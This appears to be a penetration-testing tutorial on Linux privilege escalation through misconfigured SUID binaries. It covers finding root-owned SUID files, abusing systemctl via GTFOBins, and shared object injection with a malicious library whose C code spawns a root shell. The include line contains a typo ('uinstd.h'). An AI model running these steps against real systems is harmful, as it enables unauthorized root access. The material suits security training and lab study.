# Introduction
The Set Owner User ID (SUID) and Set Group ID (SGID) are special permissions which can be attributed to Linux files and folders. If a file has either of those set, then it will be executed with the privileges of the owner / group, respectively, no matter which user actually invoked the command to run the file. 

Therefore, any files which are owned by root and have SUID set will be executed with elevated privileges. Our goal is to hunt down those files and abuse them in order to escalate our privileges. This can be easily done with the following command:

```bash
find / -perm -u=s -type f -user root 2>/dev/null
```

![](Resources/Images/Abusing%20SUID%20&%20SGID%20Binaries/Finding%20SUID%20Binaries.png)

## Exploiting Misconfigured Common Binaries
You should diligently inspect the list of files returned. Some standard Linux binaries may allow for privilege escalation if they have the SUID bit set for one reason or another. It is useful to go through these binaries check them on [GTFOBins](https://gtfobins.github.io/).

 In the above example, we find that `/bin/systemctl` has the SUID bit set and that it also has an [entry in GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/#suid):

![](Resources/Images/Abusing%20SUID%20&%20SGID%20Binaries/Systemctl%20GTFOBins.png)

By following the instructions, although with slight modifications, we can run commands with escalated privileges:

![](Resources/Images/Abusing%20SUID%20&%20SGID%20Binaries/Systemctl%20Escalated%20Privileges.png)

## Privilege Escalation via Shared Object Injection
Some binaries may be vulnerable to Shared Object (SO) Injection. This typically stems from misconfigurations where the binaries looks for a specific library in a specific directory, but can't actually find that library. If we have write access to this directory, we can hijack the search for the library by compiling our own malicious library in the place where the original was supposed to be. This is quite similar to [escalating via LD_PRELOAD](Sudo%20Escalation%20via%20LD_PRELOAD.md), but it is a bit more difficult to find and exploit.

You will first need to identify an SUID binary which has shared library misconfigurations. A lot of the times the binary will refuse to run, telling that it is missing a particular library, however, this is not always the case:

![](Resources/Images/Abusing%20SUID%20&%20SGID%20Binaries/suid-so%20Run.png)

It is always good practice to run the programme with `strace`, which will print any attempts of the binary to access libraries:

```bash
strace <binary> 2>&1 | grep -iE "open|access"
```

![](Resources/Images/Abusing%20SUID%20&%20SGID%20Binaries/strace%20Library%20Misconfigurations.png)

What stands out in particular is the `/home/user/.config/libcalc.so` library, since `/home/user/.config/` may be a writable directory. It turns out that the directory doesn't even exist, however, we can write to `/home/user/` which means that we can create it:

What now remains is to compile a malicious library into `libcalc.so`.

```cpp
#include <uinstd.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject()
{
	setuid(0);
	setgid(0);
	system("/bin/bash -i");
}
```

For older versions of GCC, you may need to use the `_init()` function syntax:

```cpp
#include <uinstd.h>
#include <stdlib.h>

void _init()
{
	setuid(0);
	setgid(0);
	system("/bin/bash -i");
}
```

Compile the malicious library:
```bash
gcc -shared -fPIC -o libcalc.so libcalc.c # add -nostartfiles if using _init()
```

![](Resources/Images/Abusing%20SUID%20&%20SGID%20Binaries/Shared%20Object%20Injection%20Successful.png)